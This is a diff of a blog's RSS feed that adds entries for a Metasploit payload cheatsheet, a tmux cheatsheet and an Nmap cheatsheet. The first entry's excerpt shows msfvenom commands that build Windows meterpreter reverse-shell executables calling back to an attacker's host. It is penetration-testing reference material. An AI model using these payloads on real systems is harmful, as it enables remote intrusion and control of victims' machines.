@@ -7,10 +7,40 @@
     <generator>Hugo -- gohugo.io</generator>
     <language>en-us</language>
     <copyright>anir0y</copyright>
-    <lastBuildDate>Mon, 01 Jul 2019 17:12:57 +0530</lastBuildDate>
+    <lastBuildDate>Mon, 01 Jul 2019 18:33:42 +0530</lastBuildDate>
     
 	<atom:link href="/class/tags/cheatsheet/index.xml" rel="self" type="application/rss+xml" />
     
+    
+    <item>
+      <title>Cheatsheet Msfpaylods</title>
+      <link>/class/blog/cheatsheet-msfpaylods/</link>
+      <pubDate>Mon, 01 Jul 2019 18:33:42 +0530</pubDate>
+      
+      <guid>/class/blog/cheatsheet-msfpaylods/</guid>
+      <description>Most Common Payloads Binaries    Command Info     msfvenom -p windows/meterpreter/reverse_tcp LHOST=(Your IP/DNS) LPORT=(Your Port) -f exe &amp;gt; example.exe Creates a simple TCP Payload for Windows   msfvenom -p windows/meterpreter/reverse_http LHOST=(Your IP/DNS) LPORT=(Your Port) -f exe &amp;gt; example.</description>
+    </item>
+    
+    <item>
+      <title>Tmux Cheatsheet</title>
+      <link>/class/blog/tmux-cheatsheet/</link>
+      <pubDate>Mon, 01 Jul 2019 18:20:27 +0530</pubDate>
+      
+      <guid>/class/blog/tmux-cheatsheet/</guid>
+      <description>start new:
+tmux  start new with session name:
+tmux new -s myname  attach:
+tmux a # (or at, or attach)  attach to named:</description>
+    </item>
+    
+    <item>
+      <title>Nmap Cheatsheet</title>
+      <link>/class/blog/nmap-cheatsheet/</link>
+      <pubDate>Mon, 01 Jul 2019 18:09:53 +0530</pubDate>
+      
+      <guid>/class/blog/nmap-cheatsheet/</guid>
+      <description>Target Specification    Switch Example Description      nmap 192.168.1.1 Scan a single IP    nmap 192.168.1.1 192.</description>
+    </item>
     
     <item>
       <title>Xss Bypassfilter</title>
